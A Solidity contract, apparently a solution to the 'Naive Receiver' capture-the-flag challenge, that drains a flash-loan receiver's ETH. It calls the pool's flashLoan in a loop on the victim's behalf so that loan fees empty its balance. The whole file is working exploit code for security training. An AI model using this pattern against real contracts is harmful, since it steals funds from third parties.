// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

interface IPool {
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

contract ExploitNaiveReceiverLender {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    IPool public immutable pool;

    constructor(address _pool) {
        pool = IPool(_pool);
    }

    function attack(IERC3156FlashBorrower _receiver) external  {
        while (address(_receiver).balance >= 1 ether) {
            pool.flashLoan(_receiver, ETH, 0, "");
        }
    }
}
